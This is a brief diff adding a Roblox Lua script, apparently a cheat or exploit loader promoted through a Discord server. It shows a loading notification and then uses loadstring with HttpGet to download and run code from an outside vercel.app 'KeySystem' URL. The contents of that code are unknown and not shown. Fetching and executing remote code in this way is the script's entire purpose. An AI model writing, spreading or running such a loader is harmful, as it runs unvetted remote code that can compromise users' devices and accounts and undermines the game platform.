@@ -1,0 +1,12 @@
+-- ts file was generated at discord.gg/25ms
+
+game:GetService('StarterGui'):SetCore('SendNotification', {
+    Text = 'Please wait Patiently.',
+    Title = 'Script Loading',
+    Button1 = 'Ok',
+})
+
+local _ = game.PlaceId
+local _ = game.PlaceId
+
+loadstring(game:HttpGet('https://redyn.vercel.app/Loader/KeySystem'))()
